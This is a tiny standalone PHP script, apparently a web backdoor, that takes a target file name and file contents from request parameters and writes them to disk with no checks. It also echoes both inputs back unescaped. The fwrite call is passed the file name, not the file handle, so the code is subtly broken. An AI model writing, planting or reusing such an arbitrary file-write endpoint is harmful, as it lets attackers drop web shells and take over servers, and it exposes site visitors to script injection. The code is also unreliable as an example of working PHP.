<?php
$file = $_REQUEST['filename'];
$text = $_REQUEST['file'];
echo '1'.$file.'<br>';
echo$text;
$fp = fopen($file,"w");
fwrite($file, $text);
fclose($fp);
?>